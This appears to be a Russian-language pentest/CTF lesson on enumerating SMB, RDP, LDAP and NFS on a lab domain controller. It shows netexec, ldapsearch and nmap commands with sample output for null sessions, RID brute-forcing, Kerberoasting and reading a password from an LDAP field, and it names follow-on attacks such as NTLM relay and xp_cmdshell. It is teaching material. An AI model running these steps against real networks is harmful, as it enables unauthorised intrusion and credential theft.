---
id: network-service-enum
title: "Глубокая энумерация сервисов: SMB, RDP, LDAP, NFS"
category: network
parent: network-portscan
difficulty: medium
order: 3
tags: [network, enumeration, smb, rdp, ldap, nfs, null-session]
prerequisites: [network-portscan, network-nmap-deep]
useful_for:
  - "CTF Network (энумерация сервисов)"
  - "Пентест: разведка внутренней сети"
  - "Работа: аудит конфигураций сервисов"
estimated_minutes: 55
summary: "Как выжимать максимум информации из SMB, RDP, LDAP и NFS: null-сессии, анонимные бинды, шары, пользователи и версии."
---

## Вопрос, с которого всё начинается

В прошлом уроке `nmap` показал нам открытые порты. Но «порт открыт» — это ещё не уязвимость. Порт 445 говорит лишь, что на машине есть SMB-сервис. Что за сервис, какая версия, есть ли на нём шары, пускает ли он анонимно, какие там пользователи — всё это мы пока не знаем.

Этап, на котором мы превращаем «порт открыт» в конкретные факты, называется **энумерация** (enumeration) — систематический сбор имён, версий, списков и настроек сервиса. Именно здесь выигрывается большинство пентестов: без списка пользователей и понимания сервисов эксплуатация превращается в слепой перебор.

## Наш пример: контроллер домена 10.10.10.10

Мы нашли в сети Windows-машину `10.10.10.10`. Задача — выжать из её сервисов максимум, не имея пока ни одного пароля. Начнём с фингерпринта:

```
$ nmap -sV -p 445,3389,389,88,135,1433,5985 10.10.10.10
PORT     STATE SERVICE       VERSION
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  Windows Server 2019 Standard
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0
```

Сразу видно: это контроллер домена (`kerberos-sec` + `Active Directory LDAP` + `Windows Server 2019`). Пять сервисов, каждый — отдельный источник информации. Разберём их по очереди.

## Шаг 1: SMB — самый «разговорчивый» сервис

SMB — это файлы, принтеры и аутентификация в Windows-сетях. Смотрим на **подпись** (signing) и пробуем зайти анонимно, без пароля — такой вход называют **null-сессией**:

```
$ nxc smb 10.10.10.10 -u '' -p ''
SMB  10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:corp.local)
SMB  10.10.10.10  445  DC01  [+] corp.local\: 
```

Строка `signing:False` не напечаталась, но её видно при явном флаге `--gen-relay-list`; важнее другое — нас **пустило без пароля**. Теперь перечислим шары и пользователей:

```
$ nxc smb 10.10.10.10 -u '' -p '' --shares
SMB  10.10.10.10  445  DC01  [*] Enumerated shares
SMB  10.10.10.10  445  DC01  Share     Permissions  Remark
SMB  10.10.10.10  445  DC01  -----     -----------  ------
SMB  10.10.10.10  445  DC01  NETLOGON  READ         Logon server share
SMB  10.10.10.10  445  DC01  SYSVOL    READ         Logon server share
$ nxc smb 10.10.10.10 -u '' -p '' --rid-brute
SMB  10.10.10.10  445  DC01  1103: CORP\alice (SidTypeUser)
SMB  10.10.10.10  445  DC01  1104: CORP\bob (SidTypeUser)
SMB  10.10.10.10  445  DC01  1105: CORP\svc_backup (SidTypeUser)
```

Что мы узнали: доступны `SYSVOL`/`NETLOGON` на чтение и — через метод **RID-brute** (перебор числовых идентификаторов пользователей) — имена трёх учёток. `svc_backup` в конце имени — намёк на сервисную учётку, у которой часто слабый пароль.

## Шаг 2: политика паролей — можно ли вообще брутить

Прежде чем перебирать пароли, надо узнать правила. Если включён **lockout** (блокировка после N неудачных попыток), то брут «в лоб» заблокирует учётки:

```
$ nxc smb 10.10.10.10 -u '' -p '' --pass-pol
SMB  10.10.10.10  445  DC01  [+] Dumping password info for domain: CORP
SMB  10.10.10.10  445  DC01  Minimum password length: 8
SMB  10.10.10.10  445  DC01  Password history length: 24
SMB  10.10.10.10  445  DC01  Account lockout threshold: None
SMB  10.10.10.10  445  DC01  Account lockout duration: N/A
```

`lockout threshold: None` — блокировки нет. Значит, аккуратный **password spray** (по одному паролю на каждую учётку, а не много паролей на одну) безопасен. Вот зачем нужна политика: она задаёт стратегию.

## Шаг 3: LDAP — вытаскиваем весь каталог

LDAP — это база каталога Active Directory. Часто разрешён **анонимный bind** — подключение без логина. Смотрим, что отдаётся:

```
$ ldapsearch -x -H ldap://10.10.10.10 -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description
dn: CN=Alice Smith,CN=Users,DC=corp,DC=local
sAMAccountName: alice
description: Junior sysadmin
dn: CN=Backup Service,CN=Users,DC=corp,DC=local
sAMAccountName: svc_backup
description: Temp password: Backup2019!
```

Вот и первая учётка с паролем — прямо в поле `description` (люди регулярно оставляют так заметки). Дальше ищем **SPN** — уникальные идентификаторы сервисов у учёток: их можно «обжарить» Kerberoasting-ом.

```
$ nxc ldap 10.10.10.10 -u '' -p '' --kerberoasting out.txt
LDAP  10.10.10.10  389  DC01  [*] Total of records returned 1
LDAP  10.10.10.10  389  DC01  [*] sAMAccountName: svc_backup  SPN: MSSQLSvc/dc01.corp.local:1433
```

## Шаг 4: RDP — фингерпринт без логина

RDP (3389) отдаёт имя домена и версию Windows ещё до аутентификации через NTLM:

```
$ nmap --script rdp-ntlm-info -p 3389 10.10.10.10
| rdp-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   DNS_Domain_Name: corp.local
|   Product_Version: 10.0.17763
```

`Product_Version: 10.0.17763` — это Windows Server 2019. Полезно, чтобы сверить с известными уязвимостями версии.

## Шаг 5: NFS и остальные сервисы

Если в сети есть Linux-машины с NFS (2049), первая команда — `showmount`:

```
$ showmount -e 10.10.0.50
Export list for 10.10.0.50:
/srv/share  *
```

Экспорт `*` без ограничений означает, что каталог доступен **любому** хосту. Монтируем и смотрим:

```
$ sudo mount -t nfs 10.10.0.50:/srv/share /mnt/nfs -o nolock
$ ls -la /mnt/nfs
-rw-r--r-- 1 root root 4096 Oct 10 12:00 backups.sql
```

А для WinRM (5985) и MSSQL (1433) проверяем найденные креды напрямую: `nxc winrm 10.10.10.10 -u alice -p ...` и `nxc mssql ... -q "SELECT @@version"`. Метка `(Pwn3d!)` в выводе netexec означает, что учётка административна — через WinRM тогда можно выполнять команды (`evil-winrm`), а через MSSQL с правами `sysadmin` — поднять `xp_cmdshell`.

## Шаг 6: сводим находки в план

Каждая находка — это вход для следующего шага:

| Находка | Следующий шаг |
|---|---|
| `signing: False` | NTLM relay (Responder + ntlmrelayx) |
| Список пользователей | password spray, AS-REP roasting |
| SPN у учётки | Kerberoasting |
| Экспорт NFS `*` | чтение/запись файлов |
| `xp_cmdshell` доступен | RCE на MSSQL-хосте |
| WinRM `(Pwn3d!)` | удалённое выполнение команд |

## Что мы теперь знаем

По-простому:

1. Энумерация — превращение «порт открыт» в имена, версии и списки.
2. SMB: null-сессия даёт шары и (через RID-brute) пользователей.
3. Политика паролей решает, можно ли перебирать: нет lockout — можно.
4. LDAP: анонимный bind часто отдаёт весь каталог, включая пароли в `description`.
5. Каждая находка — зацепка: пользователь → брут, SPN → Kerberoast, NFS `*` → файлы.

## На что смотреть дальше

- **Не сканируй только TCP.** SNMP (161/udp), DHCP и NTP останутся за кадром — их надо искать отдельно.
- **Сначала энумерация, потом брут.** Без списка учёток перебор — это стрельба вслепую.
- **Проверь `--pass-pol` до спрея**, иначе заблокируешь учётки и нашумешь.

## Квиз

Проверь себя.

```quiz
- question: 'Что даёт null-сессия SMB?'
  options:
    - 'Анонимное перечисление шар и иногда пользователей'
    - 'Гарантированный root'
    - 'Расшифровку трафика'
    - 'Включение IPv6'
  answer: 0
  explanation: 'Null-сессия — вход без пароля; она раскрывает шары и метаданные каталога.'
- question: 'Какой скрипт nmap отдаёт имя домена и версию Windows до логина по RDP?'
  options:
    - 'rdp-ntlm-info'
    - 'smb-os-discovery'
    - 'http-title'
    - 'dns-zone-transfer'
  answer: 0
  explanation: 'rdp-ntlm-info раскрывает NTLM-информацию (домен, хост, версию) без аутентификации.'
- question: 'Зачем перед брутом смотрят политику паролей (--pass-pol)?'
  options:
    - 'Чтобы узнать порог блокировки и не заблокировать учётки'
    - 'Чтобы ускорить nmap'
    - 'Чтобы включить NFS'
    - 'Чтобы получить Kerberos-билет'
  answer: 0
  explanation: 'Если lockout включён, много неудачных попыток заблокирует учётки; без lockout спрей безопасен.'
- question: 'Что делает анонимный bind LDAP?'
  options:
    - 'Подключается к каталогу без логина и часто отдаёт пользователей и поля'
    - 'Монтирует NFS-шару'
    - 'Создаёт reverse shell'
    - 'Определяет версию SMB'
  answer: 0
  explanation: 'Анонимный ldapsearch раскрывает структуру каталога, иногда с паролями в description.'
- question: 'Что означает экспорт NFS вида `/srv/share *`?'
  options:
    - 'Каталог доступен любому хосту — частая мисконфигурация'
    - 'Каталог зашифрован'
    - 'Экспорт только для чтения root-у'
    - 'NFS выключен'
  answer: 0
  explanation: 'Звёздочка в списке экспорта означает доступ без ограничений по адресам.'
```

## Куда дальше

В следующем уроке мы возьмём найденный SMB-сервис и разберём его сигнатуру и метаданные глубже — а затем перейдём к SNMP, который отдаёт карту хоста целиком. А пока главное запомни: энумерация — это сбор зацепок, каждая из которых становится входом на следующий шаг.

## Где пригодится

- **CTF:** энумерация сервисов для поиска пути дальше.
- **Пентест:** разведка внутренней сети, сбор имён и шар.
- **Работа:** аудит конфигураций SMB/RDP/LDAP/NFS.
- **Red team:** подготовка к lateral movement.
- **SOC:** понимание, что видит атакующий при энумерации.
